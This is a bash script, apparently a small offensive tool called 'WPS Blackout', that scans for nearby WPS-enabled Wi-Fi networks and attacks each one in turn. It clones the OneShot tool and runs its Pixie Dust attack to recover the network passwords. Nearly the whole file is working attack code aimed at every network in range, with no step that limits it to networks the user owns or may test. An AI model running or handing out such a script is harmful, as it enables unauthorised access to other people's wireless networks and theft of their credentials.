#!/bin/bash
# WPS Blackout by @rkhunt3r

check_root(){
    if [[ $EUID -ne 0 ]]; then
    printf "\n\e[0m[\e[91m!\e[0m] Run this script as root! \n"
    exit 1
    fi
}

req_check(){
    if [ -d $(pwd)/config/OneShot ];then
        printf "\n\e[0m[\e[92mi\e[0m] OneShot folder found! \n"
    else
        printf "\n\e[0m[\e[91m!\e[0m] OneShot folder not found! \n"
        git -C $(pwd)/config clone https://github.com/drygdryg/OneShot #clone oneshot repo
        banner
    fi
}

banner(){
    clear
    printf "<----- WPS Blackout v1.0 ----->\n"
}

function ifup {
    if [[ ! -d /sys/class/net/${1} ]]; then
        # printf 'No such interface: %s\n' "$1" >&2
        return 1
    else
        [[ $(</sys/class/net/${1}/operstate) == up ]]
    fi
}

check_ifaces(){
    printf "\n\e[0m[\e[93m*\e[0m] Checking interfaces... \n"

    if ifup wlan0; then
        printf "\n\e[0m[\e[92mi\e[0m] \e[92mwlan0\e[0m is up!\n"
        ip link set wlan0 up
        wlan0_iface=1
    else
        printf "\n\e[0m[\e[91m!\e[0m] \e[91mwlan0\e[0m is down\n"
        wlan0_iface=0
    fi

    if ifup wlan1; then
        printf "\e[0m[\e[92mi\e[0m] \e[92mwlan1\e[0m is up!\n"
        ip link set wlan1 up
        wlan1_iface=1
    else
        printf "\e[0m[\e[91m!\e[0m] \e[91mwlan1\e[0m is down\n"
        wlan1_iface=0
    fi

    sum_ifaces=$(expr $wlan1_iface + $wlan0_iface)

    if [[ "$wlan0_iface" == 0 && "$wlan1_iface" == 0 ]]; then
        printf "\n\e[0m[\e[91m!\e[0m] No interfaces found!\n"
        exit
    else
        printf "\n\e[0m[\e[92mi\e[0m] We have \e[92m$sum_ifaces\e[0m inteface/s up!\n"
    fi

}

start_blackout(){
    printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"

    printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks (15s)... \n"

    #iq200 sorting wps networks by signal strenght
    awker="$(pwd)/config/wifi.awk"
    wps_all=$(iw dev wlan0 scan duration 15 | awk -f $awker | sort)
    wps_power=($(printf "$wps_all" | grep "yes" | awk '{print $1}'))
    wps_bssid=($(printf "$wps_all" | grep "yes" | awk '{print $2}'))
    wps_ssid=($(printf "$wps_all" | grep "yes" | awk '{print $3}'))
    wps_channel=($(printf "$wps_all" | grep "yes" | awk '{print $5}'))

    i=0
    while [ $i -lt ${#wps_ssid[@]} ]
    do
        printf "\n[\e[92m$((i+1))\e[0m] \e[92m${wps_bssid[$i]} \e[93m${wps_ssid[$i]} \e[94mpwr:${wps_power[$i]} \e[96mchnl:${wps_channel[$i]}\e[0m"
        i=$((i+1))
    done

    printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_ssid[@]} WPS networks! \n"

    printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi network...\n"

    LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
    do nmcli con down uuid $line &>/dev/null;    
    done

    printf "\n\e[0m[\e[93m*\e[0m] Attacking all networks using OneShot... \n"

    y=0
    while [ $y -lt ${#wps_ssid[@]} ]
    do  
        printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#wps_ssid[@]}) Attacking ${wps_ssid[$y]}\n\n"
        # oneshot=$(python3 $(pwd)/config/OneShot/oneshot.py -i wlan0 -b ${wps_ssid[$y]} -K -w)
        python3 $(pwd)/config/OneShot/oneshot.py -i wlan0 -b ${wps_ssid[$y]} -K -w
        # cmd=$(bash cd.sh)
        # match="WPA PSK:"
        # if [[ $oneshot =~ $match ]]; then
        #     printf "\n\e[0m[\e[92mi\e[0m] Found ${wps_ssid[$y]} WPS PSK! \n"
        # else
        #     printf "\n\e[0m[\e[91m!\e[0m] Found ${wps_ssid[$y]} WPS PSK not found! \n"
        # fi

        printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
        read ener_empty_value

        # if [ $oneshot | grep -q "[*] Scanning…" ]; then
        #     echo "\e[92mSCANNING\e[0m"
        # else
        #     echo "TEST NOT Scanning"
        # fi


        y=$((y+1))
    done 

    sleep 5

    printf "\n\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n\n"

    LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
    do nmcli con up uuid $line &>/dev/null;    
    done
}

check_root
banner
req_check
check_ifaces
start_blackout